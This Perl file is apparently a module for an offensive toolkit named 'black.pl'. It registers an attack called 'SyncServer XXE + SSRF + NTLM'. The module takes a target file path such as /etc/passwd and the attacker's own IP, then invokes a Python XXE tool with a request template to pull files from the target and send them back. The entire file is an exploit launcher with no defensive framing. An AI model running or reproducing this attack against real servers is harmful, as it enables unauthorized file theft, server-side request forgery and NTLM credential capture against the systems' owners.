#!/usr/bin/perl


# CONFIG
######################
my $desc ="SyncServer XXE + SSRF + NTLM\n\t Usage: black.pl .. .. -m id_module <path>  <ip> \n\t Path like this: /etc/passwd\n \n\t Your IP address\n"; 
our $funcName="syncserver_xxe_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub syncserver_xxe_Func()
{
	my $path,$own_ip;

	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";	
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}
	if ($ARGV[$m_arg_i+2]){
		$own_ip=$ARGV[$m_arg_i+2];
		print $own_ip." - own_ip \n\n";	
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}
	
	system("python tools/xxe_rat/xtool.py -i $own_ip  -r tools/xxe_rat/syncserver.txt -f \"$path\"");
	
	
	
	
	print "\n\n";
}